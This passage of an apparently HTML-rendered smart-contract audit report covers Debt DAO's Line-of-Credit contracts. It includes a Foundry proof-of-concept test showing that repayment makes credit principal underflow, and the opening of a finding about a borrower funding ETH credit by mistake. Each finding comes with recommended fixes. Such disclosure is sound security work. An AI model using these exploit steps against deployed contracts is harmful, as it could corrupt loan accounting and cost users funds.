class=\"mtk12\">interest</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update individual credit line denominated in token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">principal</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">principalPayment</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @audit-info potential underflow without an error due to the unchecked block</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">interestRepaid</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">interest</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">interestAccrued</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RepayInterest</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">interest</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RepayPrincipal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">principalPayment</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} }</span></span></span></code></pre>\n<p>To demonstrate the issue, copy the following test case and paste it into the <code>SpigotedLine.t.sol</code> test file. Then run <code>forge test --match-test \"test_lender_use_and_repay_underflow\"</code>.</p>\n<p>Following scenario causes the repayment to underflow:</p>\n<ol>\n<li>Borrower borrows <code>1 ether</code> of <code>revenueToken</code></li>\n<li><code>2 ether</code> worth of <code>revenueToken</code> is claimed and traded from the revenue contract</li>\n<li>Use all of the previously claimed funds (<code>2 ether</code>) to repay the line of credit (= <code>1 ether</code>)</li>\n<li><code>credit.principal</code> underflows due to <code>principalPayment</code> is larger than <code>credit.principal</code></li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_lender_use_and_repay_underflow</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">largeRevenueAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">lentAmount</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">), </span><span class=\"mtk12\">lentAmount</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">revenueToken</span><span class=\"mtk1\">), </span><span class=\"mtk12\">MAX_REVENUE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">revenueC</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0xbeef</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// need new spigot for testing</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_createCredit</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">revenueToken</span><span class=\"mtk1\">), </span><span class=\"mtk12\">Denominations</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ETH</span><span class=\"mtk1\">, </span><span class=\"mtk12\">revenueC</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 1. Borrow lentAmount = 1 ether</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_borrow</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">lentAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 2. Claim and trade largeRevenueAmount = 2 ether (revenue)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tradeData</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSignature</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&#39;trade(address,address,uint256,uint256)&#39;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">revenueToken</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">Denominations</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ETH</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gwei</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">largeRevenueAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">hoax</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">line</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimAndTrade</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">revenueToken</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tradeData</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">principalBeforeRepaying</span><span class=\"mtk1\">,,,,,) = </span><span class=\"mtk12\">line</span><span class=\"mtk1\">.</span><span class=\"mtk11\">credits</span><span class=\"mtk1\">(</span><span class=\"mtk12\">line</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ids</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">principalBeforeRepaying</span><span class=\"mtk1\">, </span><span class=\"mtk12\">lentAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 3. Use and repay debt with previously claimed and traded revenue (largeRevenueAmount = 2 ether)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">line</span><span class=\"mtk1\">.</span><span class=\"mtk11\">useAndRepay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">largeRevenueAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_principal</span><span class=\"mtk1\">,,,,,) = </span><span class=\"mtk12\">line</span><span class=\"mtk1\">.</span><span class=\"mtk11\">credits</span><span class=\"mtk1\">(</span><span class=\"mtk12\">line</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ids</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underflowedPrincipal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">principalBeforeRepaying</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">underflowedPrincipal</span><span class=\"mtk1\"> -= (</span><span class=\"mtk12\">largeRevenueAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 4. Principal underflowed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_principal</span><span class=\"mtk1\">, </span><span class=\"mtk12\">underflowedPrincipal</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider asserting <code>amount</code> is less or equal than <code>credit.principal + credit.interestAccrued</code> (<code>require(amount &#x3C;= credit.principal + credit.interestAccrued);</code>). Similar as how it is done in <a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L326\"><code>LineOfCredit.depositAndRepay()</code></a></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/461\">kibagateaux (Debt DAO) confirmed</a></strong></p>\n<hr>\n<h1 id=\"medium-risk-findings-11\" style=\"position:relative;\"><a href=\"#medium-risk-findings-11\" aria-label=\"medium risk findings 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (11)</h1>\n<h2 id=\"m-01-borrower-can-by-mistake-add-own-money-to-credit-if-credit-is-in-eth\" style=\"position:relative;\"><a href=\"#m-01-borrower-can-by-mistake-add-own-money-to-credit-if-credit-is-in-eth\" aria-label=\"m 01 borrower can by mistake add own money to credit if credit is in eth permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/24\">[M-01] Borrower can by mistake add own money to credit if credit is in ETH</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/24\">rvierdiiev</a></em></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L223-L244\">https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L223-L244</a></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/LineLib.sol#L59-L74\">https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/LineLib.sol#L59-L74</a></p>\n<h3 id=\"impact-4\" style=\"position:relative;\"><a href=\"#impact-4\" aria-label=\"impact 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Borrower can mistakenly add own money to credit if credit is in ETH.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Function <code>LineOfCredit.addCredit</code> is used to create new credit.</p>\n<p>It can be called only after contest of another party.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addCredit</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">drate</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">frate</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lender</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">payable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">override</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">whileActive</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">mutualConsent</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">receiveTokenOrETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">lender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_createCredit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">interestRate</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">drate</span><span class=\"mtk1\">, </span><span class=\"mtk12\">frate</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><code>LineLib.receiveTokenOrETH(token, lender, amount)</code> is responsible for getting payment.</p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/LineLib.sol#L59-L74\">https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/LineLib.sol#L59-L74</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">receiveTokenOrETH</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) { </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TransferFailed</span><span class=\"mtk1\">(); }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">Denominations</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ETH</span><span class=\"mtk1\">) { </span><span class=\"mtk3\">// ERC20</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> { </span><span class=\"mtk3\">// ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) { </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TransferFailed</span><span class=\"mtk1\">(); }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>As you can see in case of native token payment, <code>sender</code> is not checked to be <code>msg.sender</code>, so this makes it’s possible that borrower can mistakenly pay instead of lender. It sounds funny, but it’s possible. What is needed is for the lender to call <code>addCredit</code> first and then borrower calls <code>addCredit</code> and provides value.</p>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" 